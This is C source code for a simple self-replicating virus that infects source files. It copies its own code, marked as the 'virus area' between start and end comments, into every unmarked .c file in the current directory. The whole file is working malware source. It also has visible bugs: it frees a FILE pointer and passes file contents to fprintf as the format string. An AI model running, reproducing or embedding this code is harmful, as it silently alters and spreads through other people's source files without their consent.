// Start code
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

#if defined(_MSC_VER)
#include <direct.h>
#define getcwd _getcwd
#elif defined(__GNUC__)
#include <unistd.h>
#endif

int count_lines(char *path);
int count_files(char *dirname);
void infect_file(char *path, char startString[], char **code, int n_lines_malicious_code);
void write_to_file(char *path, char **code, int number_of_lines);

int main(int argc, char **argv)
{
    // Get the path to the current file
    char *path = realpath(__FILE__, NULL);

    // 0 we are not in the virus area, 1 we are in the virus area
    int virus_area = 0;

    // In order to read the lines of the file
    char line[256];

    // We want to match this strings
    char startString[] = "// Start code";
    char endString[] = "// End code";

    // Get the number of lines of the file
    int number_lines = count_lines(path);

    printf("Number of lines: %d\n", number_lines);

    // Allocate memory for our array
    char **code = malloc(sizeof(char *) * number_lines);

    // index
    int i = 0;

    // To exit from the loop
    int exit = 0;

    // Open the file
    FILE *file = fopen(path, "r");

    while (fgets(line, sizeof(line), file) && exit == 0)
    {
        if (strncmp(line, startString, strlen(startString)) == 0)
        {
            printf("VIRUS AREA\n");
            virus_area = 1;
        }

        if (virus_area == 1)
        {
            // Copying the line value
            code[i] = strdup(line);
            i++;
        }

        if (strncmp(line, endString, strlen(endString)) == 0)
        {
            printf("EXIT VIRUS AREA\n");
            exit = 1;
        }
    }

    // Close file
    fclose(file);

    // Print values of the array
    /*for (i = 0; i < number_lines; i++)
    {        
        printf("Value: %s \n", code[i]);
    }
    */

    // Get the current directory name
    char *dirname = getcwd(NULL, 0);
    if (dirname == NULL)
    {
        perror("Error: can't get dir");
        return EXIT_FAILURE;
    }

    // Open the directory
    DIR *dir = opendir(dirname);
    if (dir == NULL)
    {
        perror("Couldn't open the directory");
        return EXIT_FAILURE;
    }

    // Allocate memory for our array
    int number_files = count_files(dirname);
    char **files_c = malloc(sizeof(char *) * number_files);

    // Reading all the files of the directory and save with the .c extension in the array
    struct dirent *ent;
    char *extension;
    i = 0;
    while ((ent = readdir(dir)) != NULL)
    {
        if ((extension = strrchr(ent->d_name, '.')) != NULL)
        {
            if (strcmp(extension, ".c") == 0)
            {
                files_c[i] = strdup(ent->d_name);
                i++;
            }
        }
    }

    // Close directory
    closedir(dir);

    // Print values of array
    /*
    for (i = 0; i < number_files; i++)
    {        
        printf("Value: %s \n", files_c[i]);
    }
    */

    // Infecting files if they are not already infected
    for (i = 0; i < number_files; i++)
    {
        infect_file(files_c[i], startString, code, number_lines);
    }

    // Free
    free(path);
    free(file);
    free(dirname);
    free(code);

    return (EXIT_SUCCESS);
}

int count_lines(char *path)
{
    FILE *file = fopen(path, "r");
    int lines = 0;
    char line[256];
    while (fgets(line, sizeof(line), file))
    {
        lines++;
    }
    fclose(file);
    return lines;
}

int count_files(char *dirname)
{
    DIR *dir = opendir(dirname);
    if (dir == NULL)
    {
        perror("Couldn't open the directory");
        return EXIT_FAILURE;
    }
    int file_count = 0;
    struct dirent *ent;
    char *extension;
    while ((ent = readdir(dir)) != NULL)
    {
        if ((extension = strrchr(ent->d_name, '.')) != NULL)
        {
            if (strcmp(extension, ".c") == 0)
            {
                file_count++;
            }
        }
    }
    closedir(dir);
    return file_count;
}

void infect_file(char *path, char startString[], char **code, int n_lines_malicious_code)
{
    printf("Infect file: ");
    FILE *file = fopen(path, "r");
    int infected = 0, i; // 0 not infected, 1 infected
    char line[256];

    // Comprove if the file is already infected
    while (fgets(line, sizeof(line), file) && infected == 0)
    {
        if (strncmp(line, startString, strlen(startString)) == 0)
        {
            printf("File is already infected\n\n");
            infected = 1;
        }
    }

    fclose(file);

    // If it is not infected
    if (infected == 0)
    {
        printf("File is not infected\n\n");
        // Get the number of lines of the file
        int number_lines = count_lines(path);

        // Allocate memory for our array
        char **final_code = malloc(sizeof(char *) * (number_lines + n_lines_malicious_code + 1)); // 1 for adding a new line at the end

        // Copying the malicious code
        for (i = 0; i < n_lines_malicious_code; i++)
        {
            // Copying the line value
            final_code[i] = strdup(code[i]);
        }

        // Insert a end of line just in case to not copy code in the same line
        final_code[i] = "\n";

        file = fopen(path, "r");

        i = n_lines_malicious_code;

        // Copying the rest of the file
        while (fgets(line, sizeof(line), file))
        {
            // Copying the line value
            final_code[i] = strdup(line);
            i++;
        }

        // Print values of the array
        /*for (i = 0; i <= n_lines_malicious_code; i++)
        {
            printf("Value: %s \n", final_code[i]);
        }
        */

        fclose(file);

        // Write to file
        write_to_file(path, final_code, number_lines + n_lines_malicious_code + 1);

        // Free
        free(final_code);
    }

    return;
}

void write_to_file(char *path, char **code, int number_of_lines)
{
    FILE *file = fopen(path, "w");
    int infected = 0, i; // 0 not infected, 1 infected
    char line[256];

    // Write the final code to file
    for (i = 0; i < number_of_lines; i++)
    {
        fprintf(file, code[i]);
    }

    fclose(file);

    return;
}
// End code